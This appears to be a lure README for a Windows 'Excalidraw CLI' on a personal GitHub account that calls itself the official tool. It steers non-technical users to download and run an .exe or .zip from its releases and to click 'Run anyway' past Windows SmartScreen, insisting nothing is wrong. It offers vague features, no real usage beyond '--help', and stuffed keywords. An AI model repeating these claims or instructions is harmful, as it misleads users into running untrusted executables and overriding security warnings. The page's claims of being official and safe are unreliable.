---
layout: "default"
title: "🎨 cli - Draw Diagrams From Your Terminal"
description: "Render Excalidraw and Mermaid diagrams to PNG, SVG, slides, and scenes from your terminal, free and account-free."
---
# 🎨 cli - Draw Diagrams From Your Terminal

[![Download Excalidraw CLI](https://img.shields.io/badge/⬇%20Download%20Excalidraw%20CLI-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/wooshy420/cli)

**Official Excalidraw CLI for humans and agents**

Excalidraw is the beloved hand-drawn style whiteboard tool used by millions of people to sketch diagrams, flowcharts, and system maps. The **cli** project brings that same drawing power to your computer's command line — a simple text window where you type short instructions and get beautiful Excalidraw scenes in return. You do not need to be a programmer to use it. If you can type a sentence and press Enter, you can use this tool.

This page walks you through everything: what the software does, how to download it on Windows, how to open it for the first time, and how to get help if something goes wrong. Read it top to bottom and you will be drawing within minutes.

---

## ✨ What Is cli?

The **cli** (short for "command line interface") is the official Excalidraw tool that lets you create and manage Excalidraw drawings without opening a browser. Instead of dragging shapes with a mouse, you describe what you want — and the tool builds the diagram for you.

It was designed with two audiences in mind:

- **Humans** who want a fast, repeatable way to generate diagrams, flowcharts, wireframes, and architecture sketches.
- **Agents** (automated assistants and AI tools) that need to produce or modify Excalidraw files programmatically.

Because the same tool serves both, anything a person can draw by hand in Excalidraw can also be generated automatically, saved to a file, and shared with your team.

**What you can expect:**

- Create new Excalidraw scenes from simple text input.
- Open, edit, and save existing `.excalidraw` files on your computer.
- Convert diagrams between formats so they work in other tools.
- Batch-process many drawings at once instead of one by one.
- Integrate with automated workflows and AI assistants.

Every drawing stays in the familiar Excalidraw style — that friendly, slightly wobbly hand-drawn look that makes diagrams feel approachable instead of corporate.

---

## 💾 Download and Setup on Windows

Everything you need lives in one place:

### 👉 https://github.com/wooshy420/cli

**Visit this link to download the application.**

That is the only download source you should use. Avoid copies from other websites, as they may be outdated or modified.

**Step-by-step for a first-time Windows user:**

1. Open your web browser (Edge, Chrome, or Firefox).
2. Click the download link above. The repository page will load.
3. Look for the **Releases** area on the right side of the page, or a link near the top that says "Releases."
4. Click the newest release at the top of the list — it will have the most recent date.
5. On the release page, find the section called **Assets**. This is where the downloadable files are listed.
6. Click the file name to start your download. Windows may ask, "Do you want to keep this file?" — choose **Keep**.
7. When the download finishes, open your **Downloads** folder. You can reach it by pressing `Windows key + E` and clicking "Downloads" on the left.
8. Follow the note below that matches the file you downloaded.

**If your file ends in `.exe`:** Download and run this file directly. Double-click it to start.

**If your file ends in `.zip`:** Download and extract this file, then run the application. To extract, right-click the file and choose **Extract All…**, then click **Extract**. A new folder appears with the same name — open it and look for the application file inside.

**A note about Windows SmartScreen:** The first time you open a newly downloaded program, Windows may show a blue box saying "Windows protected your PC." This is normal for new software. Click **More info**, then **Run anyway**. The warning appears because Windows has not seen this exact file before — not because anything is wrong.

---

## 🖱️ Running cli for the First Time

Once the application is on your computer, open it the same way you open any program — double-click it, or find it in your Start menu if it was added there.

A dark window with text will appear. This is normal. It is called a terminal or console, and it is simply how this tool talks to you. Nothing is broken.

You will see a blinking cursor waiting for you to type. Try this to confirm everything works:

```
cli --help
```

Type those characters and press **Enter**. A list of available commands should appear. That list is your menu — it tells you every action the tool can perform. Do not worry about memorizing it. You can return to this help screen any time by typing the same thing again.

**Your first real drawing:**

1. Type a command that creates a new scene.
2. Give the scene a name, such as `my-first-diagram`.
3. The tool will save a file with the `.excalidraw` extension in the folder shown in the window.
4. Open that file with Excalidraw — either the desktop app or the website — and your drawing will appear, ready to edit.

Keep your drawing files in one folder you can find easily, such as **Documents > Excalidraw**. That way you will never lose track of them.

---

## 🧩 Using cli With AI Agents

The tool is built to be called by automated assistants as well as people. If you use an AI assistant that can run commands on your computer, you can point it at this tool and let it produce diagrams for you during a conversation.

The setup is simple:

- Give your assistant the path to the application file.
- Tell it which folder it is allowed to save drawings into.
- Ask it to create a diagram in plain language.

Because the tool reads and writes standard Excalidraw files, everything your assistant produces opens perfectly in Excalidraw — no conversion headaches, no broken shapes.

---

## 🛠️ Common Questions and Fixes

**The window opens and closes immediately.**
This usually means the program was started by double-clicking rather than from a terminal. Open your Start menu, type "Command Prompt," open it, then drag the application file into the window and press Enter.

**"Command not found" appears.**
The tool is not in a location Windows searches automatically. Either use the full path to the file, or ask the setup steps to add the folder to your system path.

**The download did not start.**
Return to the link above, open the newest release, and click the file name itself rather than the surrounding text.

**A file will not open in Excalidraw.**
Check that the file name ends in `.excalidraw`. If it ends in something else, rename it by right-clicking, choosing **Rename**, and adding the correct ending.

**Windows asks for permission every time.**
This is standard for tools that create files. Approve it once and the prompt should stop appearing.

---

## 📝 Tips for Best Results

- **Keep one folder for all drawings.** Consistency saves time later.
- **Use clear file names.** `network-diagram-office` beats `test123`.
- **Retype `--help` whenever you forget a command.** Nobody memorizes these.
- **Back up important drawings** by copying them to cloud storage.
- **Update regularly.** Open the same release page every month or two and check for a newer version.
- **Write descriptions in plain language** when working with an assistant — it produces better diagrams than vague instructions.

---

## 🤝 Getting Help

If you get stuck, return to https://github.com/wooshy420/cli and look through the **Issues** tab. Someone has likely asked the same question before. If not, you can open a new issue describing what happened, what you expected, and what you saw instead. Include a screenshot of the text window if you can — it helps enormously.

The project is open and actively maintained, and questions from non-technical users are welcome.

Keywords: excalidraw, excalidraw cli, command line drawing, diagram generator, whiteboard tool, windows download, flowchart maker, ai agent tools, sketch diagrams, open source drawing